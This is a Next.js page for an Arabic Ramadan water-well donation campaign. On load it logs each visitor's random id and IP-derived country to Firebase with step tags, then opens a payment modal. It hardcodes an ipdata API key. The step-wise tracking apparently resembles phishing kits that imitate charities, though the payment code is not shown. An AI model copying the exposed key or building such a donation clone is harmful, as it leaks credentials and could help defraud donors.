"use client"

import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { LucideGlobe, LucidePhone, LucideShare2, LucideYoutube, LucideX } from "lucide-react"
import { PaymentFlow } from "@/components/payment-flow"
import { useEffect, useState } from "react"
import { addData } from "@/lib/firebase"

export default function Home() {
  const [showPaymentFlow, setShowPaymentFlow] = useState(false)
  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  async function getLocation() {
    const APIKEY = '73cc63b69c0d6f3e0e4be0127ab551c66daccd975d167f2e968e29d6';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
        id:_id,
        country: country,
        step:'home'
      })
      console.log(country);
    } catch (error) {
      console.error('Error fetching location:', error);
    }
  }
useEffect(()=>{
  addData({id:_id})
  localStorage.setItem("vistor", _id)
  getLocation()
},[])
  return (
    <main className="flex min-h-screen flex-col items-center bg-gray-100">
      <div className="w-full max-w-md mx-auto bg-white shadow-md">
        {/* Header */}
        <div className="bg-white p-4 flex justify-between items-center">
          <div className="text-orange-500 font-bold text-xl">الحملة الرمضانية (جود) 1446هـ - 2025 م</div>
          <div className="bg-orange-500 text-white px-2 py-1 rounded">EN</div>
        </div>

        {/* Main Banner */}
        <div className="relative">
          <div className="bg-[url(/soqyaa.jpg)] p-6 bg-cover min-h-[350px]">
            {/* Logos */}
            <div className="flex justify-between mb-8">
              <div className="w-32">
                
              </div>
              <div className="w-20">
                 
              </div>
            </div>

            {/* Water Bucket Image */}
            <div className="flex justify-center mb-8">
              <div className="relative w-48 h-48">
             
              </div>
            </div>

            {/* Campaign Title */}
         
          </div>
        </div>

        {/* Donation Options */}
        <div className="p-4 space-y-4">
          {/* Credit Card Donation */}
          <Card
            className="bg-gray-500 text-white p-4 rounded-md cursor-pointer hover:bg-gray-600 transition-colors"
            onClick={() => setShowPaymentFlow(true)}
          >
            <div className="flex flex-col items-center">
              <div className="flex justify-center gap-4 mb-2">
                <Image src="/donate.png" alt="donate" width={40} height={30} />
              </div>
              <p className="text-lg">للتبرع اضغظ هنا</p>
            </div>
          </Card>

          {/* SMS Donation */}
          <Card className="bg-gray-500 text-white p-4 rounded-md">
            <div className="flex flex-col items-center">
              <div className="bg-white rounded-full p-2 mb-2">
                <span className="text-gray-500 font-bold">SMS</span>
              </div>
              <p className="text-lg">للتبرع برسالة نصية</p>
            </div>
          </Card>

         
          {/* Full Well Donation */}
          <Card className="bg-gray-100 text-blue-600 p-4 rounded-md">
            <div className="flex flex-col items-center">
              <div className="mb-2">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="3" y="4" width="18" height="16" rx="2" />
                  <path d="M7 8h10" />
                  <path d="M7 12h10" />
                  <path d="M7 16h10" />
                </svg>
              </div>
              <p className="text-lg font-bold">للتبرع ببئر كامل</p>
            </div>
          </Card>

          {/* Bottom Buttons */}
          <div className="grid grid-cols-2 gap-4">
            <Card className="bg-white p-4 rounded-md flex justify-center items-center">
              <div className="flex flex-col items-center">
                <div className="text-blue-600 mb-1">
                  <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
                  </svg>
                </div>
                <p className="text-blue-600 text-sm">الواتساب</p>
              </div>
            </Card>
            <Card className="bg-white p-4 rounded-md flex justify-center items-center">
              <div className="flex flex-col items-center">
                <div className="text-blue-600 mb-1">
                  <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
                    <polyline points="9 22 9 12 15 12 15 22" />
                  </svg>
                </div>
                <p className="text-blue-600 text-sm">مشاريع حملة رمضان</p>
              </div>
            </Card>
          </div>
        </div>

        {/* Footer Social Icons */}
        <div className="border-t border-gray-200 p-4">
          <div className="flex justify-center gap-3">
            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
              <LucideGlobe className="h-5 w-5" />
            </Button>
            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
              <LucidePhone className="h-5 w-5" />
            </Button>
            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
              <LucideShare2 className="h-5 w-5" />
            </Button>
            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
              <LucideYoutube className="h-5 w-5" />
            </Button>
            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />
              </svg>
            </Button>
            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
                <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
                <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
              </svg>
            </Button>
            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
              <LucideX className="h-5 w-5" />
            </Button>
          </div>
        </div>
      </div>

      {/* Payment Flow Modal */}
      <PaymentFlow isOpen={showPaymentFlow} onClose={() => setShowPaymentFlow(false)} />
    </main>
  )
}

